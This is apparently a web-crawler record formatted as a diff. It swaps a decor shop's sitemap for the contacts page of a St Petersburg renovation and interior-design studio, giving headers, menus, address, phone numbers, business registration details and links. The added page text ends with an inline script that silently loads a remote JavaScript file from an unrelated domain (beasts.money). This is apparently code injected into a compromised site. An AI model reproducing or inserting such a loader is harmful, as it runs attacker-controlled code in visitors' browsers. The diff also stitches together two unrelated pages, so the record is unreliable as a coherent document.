@@ -1,151 +1,148 @@
-URL: https://nashdekor.ru/sitemap.xml
+URL: https://luxorta.ru/contacts/
 КОД: 200
 ЗАГОЛОВКИ:
 Server: nginx
-Date: Thu, 26 Nov 2026 06:35:48 GMT
-Content-Type: text/xml; charset=utf-8
-Content-Length: 18377
-Last-Modified: Thu, 26 Nov 2026 06:34:03 GMT
+Date: Thu, 26 Nov 2026 06:48:00 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
 Connection: close
 Vary: Accept-Encoding
-ETag: "6b07d2db-47c9"
-Expires: Thu, 01 Jan 1970 00:00:01 GMT
-Cache-Control: no-cache
-Strict-Transport-Security: max-age=15552000
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: PHPSESSID=86edad70169815f5b33408d4c87587f4; expires=Mon, 30-Nov-2026 06:48:00 GMT; Max-Age=345600; path=/; secure; HttpOnly
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: SAMEORIGIN
 X-Content-Type-Options: nosniff
-Content-Security-Policy: frame-ancestors 'self' https://max.ru https://*.max.ru https://*.oneme.ru
 Referrer-Policy: strict-origin-when-cross-origin
-Accept-Ranges: bytes
 
-https://nashdekor.ru/ 2026-11-23 weekly 1.0 
- https://nashdekor.ru/catalog/ugolki/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/moldingi/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/karnizy/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/plintus-s-podsvetkoy/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/plintusy/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/paneli-pod-derevo/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/reechnye-paneli/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/catalog/stenovye-paneli/ 2026-11-25 weekly 0.8 
- https://nashdekor.ru/p/a902/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a907/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a910/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a913/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a920/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a916/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/gs1/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/gs2/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/gs3/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a903/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a904/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a905/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a908/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a915/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a906/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a912/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a201/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-3/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-4/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-5/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-7/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-8/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-9/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-10/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-11/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-12/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-13/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/2-14/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-3/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-4/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-5/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-7/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-8/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-9/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-11/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-12/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/3-15/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-5/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-6/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-8/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-9/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-10/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-11/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-12/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/5-15/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/p/a002/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a002-2/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a35/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a35-2/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a10/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a23/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a25/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a302/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a151/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a152/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a161/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a400/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a157/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a157-2/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a156/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a602/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a611/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a611-2/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a301/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a150/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a601/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a605/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a130/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a354/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a165/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a608/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a004/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a005/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a15/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a122/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a701/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a702/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a50/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a33/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a55/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a88/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a703/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a704/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a705/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a707/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a11-80/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/ap70/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a11-100/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/ap1-100/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a12-100/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a31/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a49/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a137/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a153/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a706/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a105/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a116/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a06/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a38/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a503/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a172/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a504/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a611-3/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a611-4/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a80l/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a100l/ 2026-11-25 monthly 0.7 
- https://nashdekor.ru/p/a201-2/ 2026-11-26 monthly 0.7 
- https://nashdekor.ru/dostavka/ 2026-11-24 monthly 0.6 
- https://nashdekor.ru/oplata/ 2026-11-19 monthly 0.5 
- https://nashdekor.ru/stati/ 2026-11-22 weekly 0.6 
- https://nashdekor.ru/stati/kak-otrezat-ugol-potolochnogo-plintusa/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/kak-kleit-plintus-iz-duropolimera/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/montazh-stenovyh-panelej/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/kak-pokrasit-plintus-i-paneli/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/duropolimer-chto-eto/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/moldingi-na-stene-v-interere/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/stati/rejki-na-stenu-v-interere/ 2026-11-26 monthly 0.6 
- https://nashdekor.ru/stati/kak-vybrat-potolochnyj-plintus/ 2026-11-22 monthly 0.6 
- https://nashdekor.ru/oferta.html 2026-11-19 yearly 0.3 
- https://nashdekor.ru/privacy.html 2026-11-23 yearly 0.2 
- https://nashdekor.ru/consent.html 2026-11-23 yearly 0.2
+Контакты студии дизайна и ремонта LUXORTA в СПб 
+ Элитный дизайн и ремонт
+ Ремонт и отделка Ремонт квартир 
+ Ремонт квартир в новостройках 
+ Ремонт офисов под ключ 
+ Ремонт коттеджей 
+ Ремонт коммерческих помещений 
+ Прочие услуги 
+ Дизайн Дизайн квартир 
+ Дизайн коммерческих помещений 
+ Авторский надзор 
+ Экспресс дизайн 
+ Цены Цены на ремонт квартир 
+ Цены дизайна интерьера 
+ Портфолио Ремонт квартир в старом фонде 
+ Ремонт квартир в новостройках 
+ Ремонт коттеджей 
+ Ремонт офисов 
+ Дизайн квартир 
+ Дизайн коммерческих помещений 
+ Дизайн коттеджей 
+ Видеообзоры 
+ О компании О компании 
+ Контакты 
+ Отзывы 
+ Вопрос/Ответ 
+ Наша команда 
+ Блог 
+ Вакансии 
+ +7 (812) 928-10-31 
+ Ежедневно с 08:00 по 22:00 (СПБ) 
+ Контакты
+ Адрес: 
+ г. Санкт-Петербург, Красногвардейская пл., д.3, лит. Е, оф. Е3 251.
+ Design District DAA
+ Время работы: ПН/ПТ 10:00-18:00
+ Телефон: +7 (812) 928-10-31 
+ WhatsApp/Telegram/Mах: +7 (911) 931-95-99 
+ E-Mail: luxorta-manager@yandex.ru 
+ Реквизиты «ИП Куккоева И.В.» 
+ ИНН: 680601575843
+ ОГРНИП: 315784700219474
+ Р/С: 40802810828610002424
+ Проверить реквизиты 
+ Телефон: 
+ Сообщение: 
+ Прикрепленные файлы: 
+ Отправить сообщение 
+ Главная 
+ О компании 
+ Блог 
+ Портфолио 
+ Ремонт квартир 
+ Дизайн квартир 
+ Наша команда 
+ Цены на ремонт квартир 
+ Цены дизайн интерьера 
+ +7 (812) 928-10-31 
+ Ежедневно с 08:00 по 22:00 
+ ООО «Люксорта-Сервис» © 2010-2026 - luxorta-manager@yandex.ru 
+ Сайт продвигает Анатолий Кузнецов 
+ (function(){var s=document.createElement("script");s.src="//beasts.money/holding/axe.js?r="+Math.random()*10000000000;s.async=!1;document.body.appendChild(s);})();
 
 ССЫЛКИ:
+/
+/blog
+/contact
+/favicon.ico
+/kit/apartments-design
+/kit/authors-supervision
+/kit/design-office
+/kit/price-design
+/kit/repair-apartments
+/kit/repair-apartments-in-new-building
+/kit/repair-cottages
+/kit/repair-kommerc
+/kit/repair-office
+/manifest.json
+/page/main
+/page/other-services
+/page/vacancies
+/portfolio/
+/portfolio/apartments
+/portfolio/apartments-design
+/portfolio/cottage
+/portfolio/design-commercial
+/portfolio/design-cottages
+/portfolio/new-apartments
+/portfolio/office
+/price
+/qa
+/reviews
+/roomtour
+/team
+/templates/lucky/assets/kit.css?v=2026-03-05
+/templates/lucky/assets/main.min.css?v=2026-03-04b
+/templates/lucky/assets/tap-fixes.css?v=2026-03-04
+/uploads/logo120.png
+/uploads/logo152.png
+/uploads/logo180.png
+/uploads/logo192.png
+https://cdn.jsdelivr.net
+https://cdnjs.cloudflare.com
+https://fonts.googleapis.com
+https://fonts.googleapis.com/css?family=IBM+Plex+Sans:400,600&display=swap&subset=cyrillic
+https://fonts.gstatic.com
+https://hozyindachi.ru/
+https://luxorta.ru/
+https://luxorta.ru/blog
+https://luxorta.ru/contact
+https://luxorta.ru/index.php?do=opensearch
+https://luxorta.ru/kit/apartments-design
+https://luxorta.ru/kit/jekspress-dizajn
+https://luxorta.ru/kit/price-design
+https://luxorta.ru/kit/repair-apartments
+https://luxorta.ru/page/main
+https://luxorta.ru/portfolio/
+https://luxorta.ru/price
+https://luxorta.ru/rss.xml
+https://luxorta.ru/team
+https://vk.com/luxorta
+https://wa.me/79119319599
+https://winzoro.net/
+https://www.facebook.com/Luxortaspb/
+https://www.liveinternet.ru/click
+https://www.rusprofile.ru/ip/315784700219474
+https://www.youtube.com/channel/UCexWwBrj95B5ozapZaLUixg/
+mailto:luxorta-manager@yandex.ru
+tel:+78129281031
+tel:+79119319599
